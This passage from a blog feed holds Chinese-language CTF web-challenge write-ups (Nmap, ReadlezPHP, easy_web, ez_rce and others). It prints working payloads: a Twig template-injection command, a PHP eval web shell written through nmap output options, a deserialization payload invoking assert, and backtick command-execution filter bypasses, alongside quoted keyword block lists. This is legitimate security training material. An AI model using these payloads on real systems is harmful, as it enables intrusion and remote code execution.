class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216144813734.png" alt="image-20231216144813734"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216150315186.png" alt="image-20231216150315186"></p><h1 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h1><p>打开环境</p><p><img src="/../images/image-20231217101352330.png" alt="image-20231217101352330"></p><p>是一个在线的namp网站</p><p>尝试写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure><p>被过滤</p><p><img src="/../images/image-20231217101549048.png" alt="image-20231217101549048"></p><p>phtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>还是被过滤</p><p><img src="/../images/image-20231217101638457.png" alt="image-20231217101638457"></p><p>短标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;? echo @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="/../images/image-20231217101751551.png" alt="image-20231217101751551"></p><p><img src="/../images/image-20231217101924320.png" alt="image-20231217101924320"></p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>打开环境</p><p><img src="/../images/image-20231217104203705.png" alt="image-20231217104203705"></p><p>F12查看一下</p><p><img src="/../images/image-20231217104243867.png" alt="image-20231217104243867"></p><p>访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>构造序列化，利用命令执行即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">HelloPhp</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231217104538747.png" alt="image-20231217104538747"></p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>打开环境</p><p><img src="/../images/image-20231219204126482.png" alt="image-20231219204126482"></p><p>解码</p><p>两次base64+hex</p><p><img src="/../images/image-20231219204354996.png" alt="image-20231219204354996"></p><p>尝试对index.php进行相同编码</p><p><img src="/../images/image-20231219204524717.png" alt="image-20231219204524717"></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure><p>解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里有正则过滤，并且需要强碰撞</p><p>直接burp:</p><p><img src="/../images/image-20231219203949964.png" alt="image-20231219203949964"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NISACTF-2022-popchains&quot;&gt;&lt;a href=&quot;#NISACTF-2022-popchains&quot; class=&quot;headerlink&quot; title=&quot;[NISACTF 2022]popchains&quot;&gt;&lt;/a&gt;[NISACTF 2022]popch</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF刷题</title>
    <link href="http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/11/06/NSSCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-11-06T14:11:38.000Z</published>
    <updated>2023-12-11T00:54:05.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><p><img src="/../images/image-20231104185237617.png" alt="avatar"></p><p>构造一个数组使username指向true，password指向true</p><p>序列化输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br>    <span class="hljs-string">&#x27;password&#x27;</span> =&gt;<span class="hljs-literal">true</span>;<br><br>)<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);<br></code></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;<span class="hljs-number">5</span>d142734-b351-<span class="hljs-number">4369</span>-<span class="hljs-number">831</span>f-<span class="hljs-number">1</span>ad48e317ce6&#125;<br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你想干什么？？？？？？？？？&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>printf输出格式化字符串</p><p>&#96;&#96;反引号内容被当作命令执行</p><p>\反斜杠分割</p><p>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?code=printf(`l\s /`)<span class="hljs-comment">;</span><br>?code=printf(`ta\c /fffffffffflagafag`)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HUBUCTF-2022-新生赛-checkin&quot;&gt;&lt;a href=&quot;#HUBUCTF-2022-新生赛-checkin&quot; class=&quot;headerlink&quot; title=&quot;[HUBUCTF 2022 新生赛]checkin&quot;&gt;&lt;/a&gt;[HUBUCTF 2022</summary>
      
    
    
    
    
  </entry>
  
</feed>
